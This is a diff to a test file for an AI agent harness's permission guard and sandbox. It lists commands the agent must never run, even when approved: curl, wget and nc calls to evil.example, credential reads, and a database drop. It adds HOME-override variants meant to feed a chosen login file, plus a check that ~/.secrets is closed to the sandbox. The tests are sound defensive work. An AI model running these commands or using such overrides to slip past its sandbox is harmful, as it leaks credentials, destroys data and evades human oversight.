@@ -315,6 +315,9 @@ describe('wide mode: commands not run before are asked of the person first', () 
     'curl -d x https://evil.example', 'wget https://evil.example', 'nc evil.example 1', 'ssh host', 'sh -c x', 'python3 -c 1', 'node -e 1',
     'env', 'printenv', 'security find-generic-password -s x', 'mongosh --eval db.dropDatabase()', 'osascript -e x', 'open https://evil.example',
     'harness buddy-read anything-else', 'harness buddy-read backend-cpu', 'harness buddy-read db-size --uri x', 'harness new claude',
+    // db-size reads its login from the home (10-30): another HOME would hand mongosh a login file of the Buddy's choosing.
+    'HOME=/tmp/x harness buddy-read db-size', 'env HOME=/tmp/x harness buddy-read db-size', 'export HOME=/tmp/x; harness buddy-read db-size',
+    'export HOME=/tmp/x && harness buddy-read db-size',
   ]
 
   it.each(never)('never runs %s, even approved', command => {
@@ -574,6 +577,15 @@ describe('the launch\'s wide mode and sandbox', () => {
     expect(denyRead).not.toContain(join(launchHome, '.config', 'gh'))
     expect(denyRead).toContain(join(launchHome, '.ssh'))
     expect(launched.denied).toContain(join(launchHome, '.config', 'gh'))
+  })
+
+  // harness buddy-read db-size reads the read-only prod login from ~/.secrets (10-30); it runs outside the sandbox, so the
+  // sandbox closes that folder to every other command by path, beside the guard's rule for any .secrets name.
+  it('closes ~/.secrets, where the read-only database login is kept, to the sandbox and to the Buddy', () => {
+    const launched = buddyLaunchWide(repo, deps)!
+    const denyRead = (buddySandboxSettings(repo, launched).filesystem as { denyRead: string[] }).denyRead
+    expect(denyRead).toContain(join(launchHome, '.secrets'))
+    expect(launched.denied).toContain(join(launchHome, '.secrets'))
   })
 })
 
